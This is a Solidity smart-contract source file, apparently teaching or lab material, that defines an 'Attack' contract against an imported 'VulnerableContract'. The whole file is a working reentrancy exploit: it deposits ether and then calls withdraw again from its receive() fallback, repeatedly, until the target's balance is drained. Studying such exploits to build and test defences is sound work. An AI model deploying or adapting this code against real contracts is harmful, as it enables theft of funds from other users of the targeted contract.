// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "./VulnerableContract.sol";

contract Attack {
    VulnerableContract public vulnerable;

    constructor(address _vulnerableAddress) {
        vulnerable = VulnerableContract(_vulnerableAddress);
    }

    function attack() external payable {
        vulnerable.deposit{value: msg.value}();
        vulnerable.withdraw();
    }

    receive() external payable {
        if (address(vulnerable).balance >= msg.value) {
            vulnerable.withdraw();
        }
    }
}
